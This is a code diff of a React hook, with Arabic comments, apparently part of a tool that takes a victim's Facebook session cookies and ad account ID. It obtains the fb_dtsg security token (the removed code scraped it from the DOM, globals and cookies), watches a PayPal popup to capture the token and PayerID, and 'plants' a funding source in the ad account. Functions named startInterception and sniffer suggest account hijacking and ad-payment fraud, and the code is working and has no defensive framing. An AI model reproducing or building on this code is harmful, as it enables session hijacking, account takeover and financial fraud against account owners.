@@ -7,57 +7,22 @@ export function useAutomation() {
   const [success, setSuccess] = useState(false);
   const [extractedToken, setExtractedToken] = useState<string | null>(null);
   const [extractedPayerId, setExtractedPayerId] = useState<string | null>(null);
+  const [needsManualDtsg, setNeedsManualDtsg] = useState(false);
 
-  // دالة استخراج التوكن من المتصفح الحالي
-  const getClientFbDtsg = (): string | null => {
-    try {
-      // 1. محاولة الاستخراج من Modules (الأكثر دقة)
-      const require = (window as any).require;
-      if (require) {
-        const DTSGInitialData = require("DTSGInitialData")?.token;
-        const DTSGInitData = require("DTSGInitData")?.token;
-        if (DTSGInitialData || DTSGInitData) return DTSGInitialData || DTSGInitData;
-      }
-
-      // 2. محاولة الاستخراج من DOM Elements
-      const inputDtsg = document.querySelector('input[name="fb_dtsg"]') as HTMLInputElement;
-      if (inputDtsg && inputDtsg.value) return inputDtsg.value;
-
-      // 3. محاولة الاستخراج من Global Variable
-      if ((window as any).__DTSG?.token) return (window as any).__DTSG.token;
-
-      // 4. محاولة الاستخراج من الكوكيز
-      const cookieMatch = document.cookie.match(/dtsg_ag=([^;]+)/);
-      if (cookieMatch && cookieMatch[1]) return cookieMatch[1];
-      
-      // محاولة أخرى من الكوكيز القديمة
-      const cookieDtsg = document.cookie.match(/fb_dtsg=([^;]+)/);
-      if (cookieDtsg && cookieDtsg[1]) return cookieDtsg[1];
-
-    } catch (e) {
-      console.error("فشل استخراج التوكن من المتصفح", e);
-    }
-    return null;
-  };
-
-  const startInterception = useCallback(async (cookies: string, adAccountId: string) => {
+  const startInterception = useCallback(async (cookies: string, adAccountId: string, fbDtsg?: string) => {
     setLoading(true);
     setError(null);
     setSuccess(false);
     setExtractedToken(null);
     setExtractedPayerId(null);
+    setNeedsManualDtsg(false);
 
     try {
-      // استخراج التوكن من المتصفح قبل البدء
-      const fbDtsg = getClientFbDtsg();
-      if (!fbDtsg) {
-        throw new Error('فشل استخراج رمز الأمان (fb_dtsg) تلقائياً. تأكد أنك مسجل الدخول في نفس المتصفح.');
-      }
-
-      // 1. إرسال الطلب للسيرفر مع التوكن الجاهز
+      // إرسال الطلب للسيرفر - السيرفر يستخرج fb_dtsg تلقائياً من الكوكيز
+      // أو يستخدم الـ fbDtsg اليدوي لو المستخدم دخله
       const approvalUrl = await initiatePayPalLinking(cookies, adAccountId, fbDtsg);
 
-      // 2. فتح النافذة المنبثقة
+      // فتح النافذة المنبثقة
       const width = 600;
       const height = 600;
       const left = window.screenX + (window.outerWidth - width) / 2;
@@ -70,53 +35,74 @@ export function useAutomation() {
       );
 
       if (!popup) {
-        throw new Error('الرجاء السماح بالنوافذ المنبثقة (Pop-ups)');
+        throw new Error('الرجاء السماح بالنوافذ المنبثقة (Pop-ups) في المتصفح');
       }
 
-      // 3. مراقبة الرابط
+      // مراقبة الرابط واستخراج token + payer_id
       const sniffer = new Promise<{ token: string; payerId: string }>((resolve, reject) => {
+        const startTime = Date.now();
+        const timeout = 5 * 60 * 1000; // 5 دقائق timeout
+
         const interval = setInterval(() => {
           try {
+            if (Date.now() - startTime > timeout) {
+              clearInterval(interval);
+              popup.close();
+              reject(new Error('انتهى الوقت المسموح. جرب مرة أخرى.'));
+              return;
+            }
+
             if (popup.closed) {
               clearInterval(interval);
               reject(new Error('أُغلقت النافذة قبل إتمام العملية'));
               return;
             }
+
             // محاولة قراءة الرابط (قد تفشل بسبب سياسة المتصفح وهذا طبيعي)
             try {
               const href = popup.location.href;
-              const url = new URL(href);
-              const token = url.searchParams.get('token');
-              const payerId = url.searchParams.get('payer_id') || url.searchParams.get('PayerID');
-              
-              if (token && payerId) {
-                clearInterval(interval);
-                resolve({ token, payerId });
+              if (href && href.includes('paypal.com') && (href.includes('token=') || href.includes('PayerID='))) {
+                const url = new URL(href);
+                const token = url.searchParams.get('token');
+                const payerId = url.searchParams.get('payer_id') || url.searchParams.get('PayerID');
+
+                if (token && payerId) {
+                  clearInterval(interval);
+                  resolve({ token, payerId });
+                }
               }
             } catch {
-              // تجاهل أخطاء الـ Cross-Origin
+              // تجاهل أخطاء الـ Cross-Origin - هذا طبيعي جداً
             }
-          } catch (e) {}
+          } catch (e) {
+            // تجاهل أي أخطاء أخرى
+          }
         }, 300);
       });
 
       const { token, payerId } = await sniffer;
       popup.close();
-      
+
       setExtractedToken(token);
       setExtractedPayerId(payerId);
 
-      // 5. زرع وسيلة الدفع
+      // زرع وسيلة الدفع
       await insertFundingSource(cookies, adAccountId, token, payerId);
       setSuccess(true);
-      
+
     } catch (err: any) {
       const serverMessage = err.response?.data?.error;
+      const needsManual = err.response?.data?.needsManualDtsg;
+
+      if (needsManual) {
+        setNeedsManualDtsg(true);
+      }
+
       setError(serverMessage || err.message || 'حدث خطأ غير متوقع');
     } finally {
       setLoading(false);
     }
   }, []);
 
-  return { startInterception, loading, error, success, extractedToken, extractedPayerId };
+  return { startInterception, loading, error, success, extractedToken, extractedPayerId, needsManualDtsg };
 }
